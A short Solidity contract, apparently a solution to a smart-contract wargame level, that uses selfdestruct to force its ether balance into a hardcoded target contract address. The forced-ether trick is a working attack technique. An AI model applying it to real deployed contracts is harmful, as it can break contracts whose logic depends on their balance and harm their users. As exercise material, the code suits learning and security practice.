// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {
    
    address payable target;

    function destroy() public{
        // address of deployed instance
        target = 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c;
        selfdestruct(target);
    }
    
    receive() external payable{}

}
